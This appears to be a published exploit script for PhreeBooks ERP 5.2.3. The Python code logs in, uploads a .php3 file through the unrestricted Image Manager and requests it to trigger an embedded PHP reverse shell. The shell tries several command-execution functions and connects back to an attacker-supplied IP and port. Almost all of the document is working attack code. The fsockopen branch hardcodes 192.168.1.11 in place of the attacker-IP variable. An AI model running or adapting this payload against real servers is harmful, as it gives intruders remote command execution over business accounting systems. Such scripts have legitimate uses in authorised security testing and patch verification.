# Exploit Title: PhreeBooks ERP 5.2.3 - Remote Command Execution
# Date: 2010-04-03
# Exploit Author: Metin Yunus Kandemir (kandemir)
# Vendor Homepage: https://www.phreesoft.com/
# Software Link: https://sourceforge.net/projects/phreebooks/
# Version: v5.2.3
# Category: Webapps
# Tested on: XAMPP for Linux 5.6.38-0
# Software Description : PhreeBooks 5 is a completely new web based ERP / Accounting
# application that utilizes the redesigned Bizuno ERP library from PhreeSoft
# ==================================================================
# PoC: There are no file extension controls on Image Manager.
# If an authorized user is obtained, it is possible to run a malicious PHP file on the server.
# The following basic python exploit uploads and executes PHP File for you.

import requests
import sys
import urllib, re, random

if (len(sys.argv) != 2):
    print "[*] Usage: poc.py <RHOST><RPATH> (192.168.1.10/test123)"
    exit(0)

rhost = sys.argv[1]

# Information Inputs

UserName = str(raw_input("User Mail: "))
Password = str(raw_input("Password: "))
Aip = str(raw_input("Atacker IP: "))
APort = str(raw_input("Atacker Port: "))

Ready = str(raw_input("Do you listen to port "+APort+" through the IP address you attacked? Y/N "))
if Ready != "Y":
  print "You should listen your port with NetCat or other handlers!"
  sys.exit()

# Login
boundary = "1663866149167960781387708339"
url = "http://"+rhost+"/index.php?&p=bizuno/portal/login"

headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Referer": "http://"+rhost+"/index.php?", "Content-Type": "multipart/form-data; boundary=---------------------------"+boundary+"", "Connection": "close"}

ldata="-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"UserID\"\r\n\r\n"+UserName+"\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"UserPW\"\r\n\r\n"+Password+"\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"UserLang\"\r\n\r\nen_US\r\n-----------------------------"+boundary+"--\r\n"

r = requests.post(url, headers=headers, data=ldata)

cookies = r.headers['Set-Cookie']
cookie = re.split(r'\s', cookies)[6].replace(';','').replace('bizunoSession=','').strip()
Ucookie = re.split(r'\s', cookies)[13].replace(';','').replace('bizunoUser=','').strip()

# Upload

fname = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for i in range(10)) + ".php3"
exec_url = "http://"+rhost+"/index.php?&p=bizuno/image/manager&imgTarget=&imgMgrPath=&imgSearch=&imgAction=upload"

exec_cookies = {"bizunoLang": "en_US", "bizunoUser": ""+Ucookie+"", "bizunoSession": ""+cookie+""}

exec_headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Referer": "http://"+rhost+"/index.php?", "Content-Type": "multipart/form-data; boundary=---------------------------"+boundary+"", "Connection": "close"}

exec_data="-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"imgSearch\"\r\n\r\n\r\n-----------------------------"+boundary+"\r\nContent-Disposition: form-data; name=\"imgFile\"; filename=\""+fname+"\"\r\nContent-Type: binary/octet-stream\r\n\r\n<?php\n      $ipaddr='"+Aip+"';\n      $port="+APort+";\n      @error_reporting(0);\n      @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);\n      $dis=@ini_get('disable_functions');\n      if(!empty($dis)){\n        $dis=preg_replace('/[, ]+/', ',', $dis);\n        $dis=explode(',', $dis);\n        $dis=array_map('trim', $dis);\n      }else{\n        $dis=array();\n      }\n      \n\n    if(!function_exists('gsMRl')){\n      function gsMRl($c){\n        global $dis;\n        \n      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {\n        $c=$c.\" 2>&1\\n\";\n      }\n      $oKFwG='is_callable';\n      $iodQxhE='in_array';\n      \n      if($oKFwG('proc_open')and!$iodQxhE('proc_open',$dis)){\n        $handle=proc_open($c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes);\n        $o=NULL;\n        while(!feof($pipes[1])){\n          $o.=fread($pipes[1],1024);\n        }\n        @proc_close($handle);\n      }else\n      if($oKFwG('popen')and!$iodQxhE('popen',$dis)){\n        $fp=popen($c,'r');\n        $o=NULL;\n        if(is_resource($fp)){\n          while(!feof($fp)){\n            $o.=fread($fp,1024);\n          }\n        }\n        @pclose($fp);\n      }else\n      if($oKFwG('exec')and!$iodQxhE('exec',$dis)){\n        $o=array();\n        exec($c,$o);\n        $o=join(chr(10),$o).chr(10);\n      }else\n      if($oKFwG('passthru')and!$iodQxhE('passthru',$dis)){\n        ob_start();\n        passthru($c);\n        $o=ob_get_contents();\n        ob_end_clean();\n      }else\n      if($oKFwG('shell_exec')and!$iodQxhE('shell_exec',$dis)){\n        $o=shell_exec($c);\n      }else\n      if($oKFwG('system')and!$iodQxhE('system',$dis)){\n        ob_start();\n        system($c);\n        $o=ob_get_contents();\n        ob_end_clean();\n      }else\n      {\n        $o=0;\n      }\n    \n        return $o;\n      }\n    }\n    $nofuncs='no exec functions';\n    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){\n      $s=@fsockopen(\"tcp://192.168.1.11\",$port);\n      while($c=fread($s,2048)){\n        $out = '';\n        if(substr($c,0,3) == 'cd '){\n          chdir(substr($c,3,-1));\n        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {\n          break;\n        }else{\n          $out=gsMRl(substr($c,0,-1));\n          if($out===false){\n            fwrite($s,$nofuncs);\n            break;\n          }\n        }\n        fwrite($s,$out);\n      }\n      fclose($s);\n    }else{\n      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);\n      @socket_connect($s,$ipaddr,$port);\n      @socket_write($s,\"socket_create\");\n      while($c=@socket_read($s,2048)){\n        $out = '';\n        if(substr($c,0,3) == 'cd '){\n          chdir(substr($c,3,-1));\n        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {\n          break;\n        }else{\n          $out=gsMRl(substr($c,0,-1));\n          if($out===false){\n            @socket_write($s,$nofuncs);\n            break;\n          }\n        }\n        @socket_write($s,$out,strlen($out));\n      }\n      @socket_close($s);\n    }\n?>\n\r\n-----------------------------"+boundary+"--\r\n"

requests.post(exec_url, headers=exec_headers, cookies=exec_cookies, data=exec_data)

# Exec

requests.get("http://"+rhost+"/myFiles/images/"+fname+"")